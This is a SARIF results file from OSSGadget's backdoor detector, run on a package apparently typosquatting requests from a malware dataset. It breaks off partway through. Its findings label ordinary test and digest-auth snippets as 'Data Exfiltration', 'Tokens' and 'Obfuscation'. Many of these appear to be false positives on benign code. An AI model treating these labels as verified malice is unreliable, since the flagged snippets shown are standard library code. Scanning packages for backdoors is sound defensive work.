{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.1.428+ed0e2cfe6a"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 393,
                  "startColumn": 20,
                  "endLine": 393,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/path/to/thing/#view=edit&token=hunter2'.format(host, port)\n        r = requests.get(url)\n        raw_request = r.content\n\n        assert r.status_code == 200\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/path/to/thing/#view=edit&token=hunter2'.format(host, port)\n        r = requests.get(url)\n        raw_request = r.content\n\n        assert r.status_code == 200\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/path/to/thing/#view=edit&token=hunter2'.format(host, port)\n        r = requests.get(url)\n        raw_request = r.content\n\n        assert r.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 350,
                  "startColumn": 20,
                  "endLine": 350,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/path/to/thing/#view=edit&token=hunter2'.format(host, port)\n        r = requests.get(url)\n        raw_request = r.content\n\n        assert r.status_code == 200\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/path/to/thing/#view=edit&token=hunter2'.format(host, port)\n        r = requests.get(url)\n        raw_request = r.content\n\n        assert r.status_code == 200\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/path/to/thing/#view=edit&token=hunter2'.format(host, port)\n        r = requests.get(url)\n        raw_request = r.content\n\n        assert r.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 326,
                  "startColumn": 20,
                  "endLine": 326,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = u'http://{}:{}'.format(host, port)\n        r = requests.get(url=url, allow_redirects=True)\n        assert r.status_code == 200\n        assert len(r.history) == 1\n        assert r.history[0].status_code == 301\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = u'http://{}:{}'.format(host, port)\n        r = requests.get(url=url, allow_redirects=True)\n        assert r.status_code == 200\n        assert len(r.history) == 1\n        assert r.history[0].status_code == 301\n",
                      "markdown": "`\n    with server as (host, port):\n        url = u'http://{}:{}'.format(host, port)\n        r = requests.get(url=url, allow_redirects=True)\n        assert r.status_code == 200\n        assert len(r.history) == 1\n        assert r.history[0].status_code == 301\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 295,
                  "startColumn": 24,
                  "endLine": 295,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        with override_environ(**kwargs):\n            # fake proxy's lack of response will cause a ConnectionError\n            with pytest.raises(requests.exceptions.ConnectionError):\n                requests.get(url)\n\n        # the fake proxy received a request\n        assert len(fake_proxy.handler_results) == 1\n",
                    "rendered": {
                      "text": "        with override_environ(**kwargs):\n            # fake proxy's lack of response will cause a ConnectionError\n            with pytest.raises(requests.exceptions.ConnectionError):\n                requests.get(url)\n\n        # the fake proxy received a request\n        assert len(fake_proxy.handler_results) == 1\n",
                      "markdown": "`        with override_environ(**kwargs):\n            # fake proxy's lack of response will cause a ConnectionError\n            with pytest.raises(requests.exceptions.ConnectionError):\n                requests.get(url)\n\n        # the fake proxy received a request\n        assert len(fake_proxy.handler_results) == 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 264,
                  "startColumn": 20,
                  "endLine": 264,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server didn't receive auth from us.\n        assert r.status_code == 200\n        assert len(r.history) == 0\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server didn't receive auth from us.\n        assert r.status_code == 200\n        assert len(r.history) == 0\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server didn't receive auth from us.\n        assert r.status_code == 200\n        assert len(r.history) == 0\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 227,
                  "startColumn": 20,
                  "endLine": 227,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server didn't authenticate us.\n        assert r.status_code == 401\n        assert r.history[0].status_code == 401\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server didn't authenticate us.\n        assert r.status_code == 401\n        assert r.history[0].status_code == 401\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server didn't authenticate us.\n        assert r.status_code == 401\n        assert r.history[0].status_code == 401\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 177,
                  "startColumn": 20,
                  "endLine": 177,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server succeeded in authenticating.\n        assert r.status_code == 200\n        # Verify Authorization was sent in final request.\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server succeeded in authenticating.\n        assert r.status_code == 200\n        # Verify Authorization was sent in final request.\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.get(url, auth=auth)\n        # Verify server succeeded in authenticating.\n        assert r.status_code == 200\n        # Verify Authorization was sent in final request.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 119,
                  "startColumn": 24,
                  "endLine": 119,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        with pytest.raises(requests.exceptions.InvalidHeader):\n            r = requests.get(url)\n        close_server.set()\n\n\n",
                    "rendered": {
                      "text": "    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        with pytest.raises(requests.exceptions.InvalidHeader):\n            r = requests.get(url)\n        close_server.set()\n\n\n",
                      "markdown": "`    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        with pytest.raises(requests.exceptions.InvalidHeader):\n            r = requests.get(url)\n        close_server.set()\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 20,
                  "endLine": 89,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    with server as (host, port):\n        expected_host = '{}:{}'.format(host, port)\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, stream=True)\n        close_server.set()  # release server block\n\n    expected_header = b'Host: %s\\r\\n' % expected_host.encode('utf-8')\n",
                    "rendered": {
                      "text": "    with server as (host, port):\n        expected_host = '{}:{}'.format(host, port)\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, stream=True)\n        close_server.set()  # release server block\n\n    expected_header = b'Host: %s\\r\\n' % expected_host.encode('utf-8')\n",
                      "markdown": "`    with server as (host, port):\n        expected_host = '{}:{}'.format(host, port)\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, stream=True)\n        close_server.set()  # release server block\n\n    expected_header = b'Host: %s\\r\\n' % expected_host.encode('utf-8')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 20,
                  "endLine": 71,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, headers={'Host': custom_host}, stream=True)\n        close_server.set()  # release server block\n\n    expected_header = b'Host: %s\\r\\n' % custom_host.encode('utf-8')\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, headers={'Host': custom_host}, stream=True)\n        close_server.set()  # release server block\n\n    expected_header = b'Host: %s\\r\\n' % custom_host.encode('utf-8')\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, headers={'Host': custom_host}, stream=True)\n        close_server.set()  # release server block\n\n    expected_header = b'Host: %s\\r\\n' % custom_host.encode('utf-8')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 24,
                  "endLine": 57,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        with pytest.raises(requests.exceptions.ChunkedEncodingError):\n            r = requests.get(url)\n        close_server.set()  # release server block\n\n\n",
                    "rendered": {
                      "text": "    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        with pytest.raises(requests.exceptions.ChunkedEncodingError):\n            r = requests.get(url)\n        close_server.set()  # release server block\n\n\n",
                      "markdown": "`    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        with pytest.raises(requests.exceptions.ChunkedEncodingError):\n            r = requests.get(url)\n        close_server.set()  # release server block\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_lowlevel.py"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 20,
                  "endLine": 32,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, stream=True)\n        close_server.set()  # release server block\n\n    assert r.status_code == 200\n",
                    "rendered": {
                      "text": "\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, stream=True)\n        close_server.set()  # release server block\n\n    assert r.status_code == 200\n",
                      "markdown": "`\n    with server as (host, port):\n        url = 'http://{}:{}/'.format(host, port)\n        r = requests.post(url, data=data, stream=True)\n        close_server.set()  # release server block\n\n    assert r.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 5,
                  "endLine": 17,
                  "endColumn": 11,
                  "snippet": {
                    "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                    "rendered": {
                      "text": "import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n",
                      "markdown": "`import threading\nimport warnings\n\nfrom base64 import b64encode\n\nfrom .compat import urlparse, str, basestring\nfrom .cookies import extract_cookies_to_jar\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 26,
                  "endLine": 251,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            # Rewind the file position indicator of the body to where\n            # it was to resend the request.\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get('www-authenticate', '')\n\n        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n",
                    "rendered": {
                      "text": "            # Rewind the file position indicator of the body to where\n            # it was to resend the request.\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get('www-authenticate', '')\n\n        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n",
                      "markdown": "`            # Rewind the file position indicator of the body to where\n            # it was to resend the request.\n            r.request.body.seek(self._thread_local.pos)\n        s_auth = r.headers.get('www-authenticate', '')\n\n        if 'digest' in s_auth.lower() and self._thread_local.num_401_calls < 2:\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 40,
                  "endLine": 136,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n        if algorithm is None:\n",
                    "rendered": {
                      "text": "        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n        if algorithm is None:\n",
                      "markdown": "`        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n        if algorithm is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 135,
                  "startColumn": 43,
                  "endLine": 135,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n",
                    "rendered": {
                      "text": "        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n",
                      "markdown": "`        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 37,
                  "endLine": 134,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n",
                    "rendered": {
                      "text": "\n        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n",
                      "markdown": "`\n        realm = self._thread_local.chal['realm']\n        nonce = self._thread_local.chal['nonce']\n        qop = self._thread_local.chal.get('qop')\n        algorithm = self._thread_local.chal.get('algorithm')\n        opaque = self._thread_local.chal.get('opaque')\n        hash_utf8 = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 45,
                  "endLine": 301,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 17,
                  "endLine": 301,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                    "rendered": {
                      "text": "    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n",
                      "markdown": "`    def __eq__(self, other):\n        return all([\n            self.username == getattr(other, 'username', None),\n            self.password == getattr(other, 'password', None)\n        ])\n\n    def __ne__(self, other):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 54,
                  "endLine": 182,
                  "endColumn": 62,
                  "snippet": {
                    "text": "        if p_parsed.query:\n            path += '?' + p_parsed.query\n\n        A1 = '%s:%s:%s' % (self.username, realm, self.password)\n        A2 = '%s:%s' % (method, path)\n\n        HA1 = hash_utf8(A1)\n",
                    "rendered": {
                      "text": "        if p_parsed.query:\n            path += '?' + p_parsed.query\n\n        A1 = '%s:%s:%s' % (self.username, realm, self.password)\n        A2 = '%s:%s' % (method, path)\n\n        HA1 = hash_utf8(A1)\n",
                      "markdown": "`        if p_parsed.query:\n            path += '?' + p_parsed.query\n\n        A1 = '%s:%s:%s' % (self.username, realm, self.password)\n        A2 = '%s:%s' % (method, path)\n\n        HA1 = hash_utf8(A1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 24,
                  "endLine": 113,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 13,
                  "endLine": 113,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                    "rendered": {
                      "text": "\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n",
                      "markdown": "`\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n        self._thread_local = threading.local()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/auth.py"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 33,
                  "endLine": 111,
                  "endColumn": 41,
                  "snippet": {
                    "text": "class HTTPDigestAuth(AuthBase):\n    \"\"\"Attaches HTTP Digest Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n",
                    "rendered": {
                      "text": "class HTTPDigestAuth(AuthBase):\n    \"\"\"Attaches HTTP Digest Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n",
                      "markdown": "`class HTTPDigestAuth(AuthBase):\n    \"\"\"Attaches HTTP Digest Authentication to the given Request object.\"\"\"\n\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        # Keep state in per-thread local storage\n`"
                    }
                  },
